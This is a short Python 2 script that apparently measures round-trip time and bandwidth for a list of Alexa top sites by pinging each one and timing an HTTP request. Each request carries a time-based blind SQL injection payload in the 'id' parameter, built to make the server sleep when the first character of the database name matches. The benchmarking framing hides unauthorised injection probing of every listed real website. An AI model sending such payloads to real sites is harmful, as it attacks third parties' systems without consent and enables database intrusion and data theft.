# -*- coding: utf-8 -*-
"""
Created on Tue Mar 14 14:52:08 2017

@author: root
"""
from __future__ import print_function
from collections import defaultdict
import requests
import time
import ping, socket
import sys


sites=[]
f = open('Alexa_sites')
l = f.readline().rstrip()
while l:
    if l not in sites:
#        if l.startswith('Https'):
#            sites.append({'name':l[8:].lower(),'uri':l.lower()})
       #if not l.startswith('Https'):
        sites.append({'name':('www.'+l).lower(),'uri':('http://www.'+l).lower()})
    l = f.readline().rstrip()
        
sites_rtt_bw = defaultdict(dict)
f = open('Alexa_sites_rtt_bw','w')
for s in sites:
    try:
        p = ping.Ping(s['name'], timeout=500)
        delay = p.do()
        if delay==None:
            continue
    except socket.error, e:
        print ("Ping Error:", e)
        continue

        
    payload = {"id": "1' and if (ascii(substr(database(), 1, 1))=115,sleep(3),null) --+"}
    start = time.time()
    try:    
        r = requests.get(s['uri'], params=payload)
        r.content  # wait until full content has been transfered
    except requests.exceptions.ConnectionError:
        print('connection error')
        
    responseTime = (time.time() - start)*1000
    print('Response time: ' + str(responseTime))
    if r.status_code == requests.codes.ok:
        if 'content-length' in r.headers.keys():
            responseLen = float(r.headers['content-length']) + sys.getsizeof(r.headers)+sys.getsizeof(r.request.headers) + 64
            print('Response Length: ' + str(responseLen))
            if responseTime - delay > 0:
                bw = responseLen/(responseTime - delay)
            else:
                bw = responseLen/responseTime
    else:
        continue
    sites_rtt_bw.setdefault(s['name'],{'rtt': delay, 'bw':bw})
    print(s['name'] + ' ' + str(delay) + ' ' + str(bw) , file=f)    
f.close()
    



